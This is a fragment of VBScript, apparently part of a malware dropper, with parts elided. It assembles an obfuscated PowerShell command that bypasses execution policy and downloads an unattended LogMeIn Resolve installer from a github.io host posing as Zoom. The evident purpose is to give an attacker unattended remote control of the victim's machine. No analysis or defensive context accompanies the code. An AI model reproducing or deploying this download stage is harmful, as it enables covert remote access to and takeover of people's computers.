...
' URL: https://zoomconnect.github.io/dray/LogMeInResolve_Unattended.msi
Option Explicit
...
KXuFJ = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & Chr(34) & "(New-Object Net.WebClient).DownloadFile(" & Chr(39) & "https://zoomconnect.github.io/dray/LogMeInResolve_Unattended.msi" & Chr(39) & "," & Chr(39) & Brwfim & Chr(39) & ")" & Chr(34)
